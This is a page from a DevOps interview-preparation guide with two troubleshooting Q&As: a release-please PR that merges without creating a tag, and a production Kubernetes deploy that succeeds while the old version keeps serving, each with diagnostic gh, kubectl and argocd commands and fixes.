### Q199. release-please merged its PR but no release or tag was created. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The workflow lacks `contents: write`, the release PR was merged with a modified title or label (`autorelease: pending` removed), squash settings altered the commit, or the run that should create the release failed.

**Diagnose →**
```bash
gh run list --workflow release-please.yml --limit 3
gh pr view <release-pr> --json labels
```

**Fix →** Restore the label to `autorelease: pending`, re-run the workflow with correct permissions.

**Prevent →** Do not hand-edit release PRs except the changelog body.

</details>

### Q200. Prod deploy succeeded in GitHub, but the old version is still serving traffic. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The workflow deployed to the wrong cluster or namespace (kubeconfig context from a previous step), applied manifests with the same tag so no rollout happened (mutable tag), a GitOps controller reverted the change, or a CDN or ingress still routes to old pods.

**Diagnose →**
```bash
kubectl config current-context
kubectl -n shack-prod get deploy shack-api -o jsonpath='{.spec.template.spec.containers[0].image}'
kubectl -n shack-prod rollout history deploy/shack-api
argocd app get shack-api-prod
```

**Fix →** Deploy by digest so every release changes the pod spec, set the context explicitly from the environment, and let GitOps own the change if Argo CD manages the app.

**Prevent →** A post-deploy verification step that calls `/api/version` and compares the returned SHA with `github.sha`.

</details>

---

[⬅ Back to GitHub Actions](./README.md) · [🏠 Home](../README.md)

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
